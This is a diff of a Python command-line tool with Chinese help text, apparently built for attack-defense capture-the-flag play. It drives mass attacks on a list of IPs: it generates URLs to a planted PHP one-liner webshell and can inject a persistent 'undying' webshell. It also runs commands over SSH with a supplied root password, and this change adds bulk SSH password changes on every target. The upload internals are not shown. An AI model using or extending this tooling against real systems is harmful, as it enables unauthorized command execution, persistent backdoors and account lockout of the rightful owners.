@@ -20,9 +20,11 @@ if __name__ == '__main__':
     parser.add_argument('-s', '--use_system', action='store_true', help='使用 system 函数而不是 eval。')
     parser.add_argument('-c', '--command', type=str, help='需要执行的命令。')
     parser.add_argument('-i', '--inject', action='store_true', default=False, help='是否注入不死马')
-    parser.add_argument('-sp', '--ssh_port', type=int, default=22, help='SSH 用户名')
-    parser.add_argument('-su', '--ssh_username', type=str, default='root', help='SSH 用户名')
-    parser.add_argument('-spw', '--ssh_password', type=str, help='SSH 密码')
+    parser.add_argument('--ssh_port', type=int, default=22, help='SSH 用户名')
+    parser.add_argument('--ssh_username', type=str, default='root', help='SSH 用户名')
+    parser.add_argument('--ssh_passwd', type=str, help='SSH 密码')
+    parser.add_argument('--ssh_change', action='store_true', default=False, help='是否修改 SSH 密码')
+    parser.add_argument('--ssh_new_passwd', type=str, help='SSH 新密码')
     args = parser.parse_args()
 
     # 检查是否有参数被输入
@@ -31,6 +33,8 @@ if __name__ == '__main__':
         exit(1)
 
     manager = IPManager()
+    ssh_con = SSHConnectionTester(int(args.ssh_port), username=args.ssh_username)
+    php_con = PHPConnectionTester()
 
     if args.add:
         manager.add(args.add)
@@ -39,7 +43,6 @@ if __name__ == '__main__':
     if args.path:
         manager.generate_urls(args.port, args.path)
         manager.save_urls_to_file()
-        php_con = PHPConnectionTester()
         if args.inject:
             php_con.upload(key=args.key, port=args.port, method=args.method, use_system=args.use_system)
         else:
@@ -51,10 +54,12 @@ if __name__ == '__main__':
     else:
         rich.print("[*]未指定web服务一句话路径，跳过路径生成")
 
-    if args.ssh_password:
-        ssh_con = SSHConnectionTester()
-        ssh_con.test_all_ips(
-            port=int(args.ssh_port), command=args.command, username=args.ssh_username, password=args.ssh_password
-        )
+    if args.ssh_passwd:
+        ssh_con.test_all_ips(command=args.command, password=args.ssh_passwd)
     else:
         rich.print("[*]未指定SSH连接密码，跳过SSH连接测试")
+
+    if args.ssh_change and args.ssh_passwd and args.ssh_new_passwd:
+        ssh_con.change_passwords_in_bulk(old_password=args.ssh_passwd, new_password=args.ssh_new_passwd)
+    else:
+        rich.print("[*]未指定SSH密码修改或者ssh旧密码与新密码，跳过SSH密码修改")
